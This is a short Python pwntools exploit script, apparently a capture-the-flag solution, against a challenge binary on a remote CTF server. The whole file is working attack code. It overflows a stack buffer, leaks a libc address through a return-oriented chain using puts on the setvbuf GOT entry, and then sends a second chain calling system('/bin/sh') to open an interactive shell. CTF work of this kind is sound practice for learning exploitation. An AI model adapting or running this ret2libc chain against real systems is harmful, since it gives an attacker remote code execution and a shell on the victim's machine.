#!/usr/bin/python
#(metantz)

from pwn import *
import sys

context(arch='amd64', os='linux')
binary = 'chall1'
server = 'challs.xmas.htsp.ro'
port = 12006

proc = remote(server,port)

print proc.readuntil("snowmen?\n")

"""
0x0000000000401030  puts@plt
0x0000000000401040  read@plt
0x0000000000401050  strcmp@plt
0x0000000000401060  setvbuf@plt
0x404030	    setvbuf@got.plt
0x0000000000401273: pop rdi; ret; 
0x0000000000401271: pop rsi; pop r15; ret; 
0x401167 main
"""
padding = "A"*18
payload = padding

#leak got
payload += p64(0x401273) #pop rdi
payload += p64(0x404030) #setvbuf@got.plt
payload += p64(0x401030) #puts@plt
payload += p64(0x401167) #main
proc.send(payload)

proc.readline()
leaked = u64(proc.readline().strip().ljust(8,'\x00'))

#https://libc.blukat.me/?q=setvbuf%3A2f0&l=libc6_2.27-3ubuntu1_amd64
"""
	system 		0x04f440 	0x0
	setvbuf 	0x0812f0 	0x31eb0
	open 		0x10fc40 	0xc0800
	read 		0x110070 	0xc0c30
	write 		0x110140 	0xc0d00
	str_bin_sh 	0x1b3e9a 	0x164a5a
"""
log.info("leaked setvbuf got: "+str(hex(leaked)))

libc = leaked - 0x0812f0

log.info("libc base: " + str(hex(libc)))
system = libc + 0x04f440
log.info("libc system: "+str(hex(system)))
binsh = libc + 0x1b3e9a
log.info("libc binsh: "+str(hex(binsh)))

proc.readuntil("snowmen?\n")


payload = "A"*18
payload += p64(0x401273) #pop rdi
payload += p64(binsh)
payload += p64(system)

proc.sendline()
proc.send(payload)
proc.interactive()


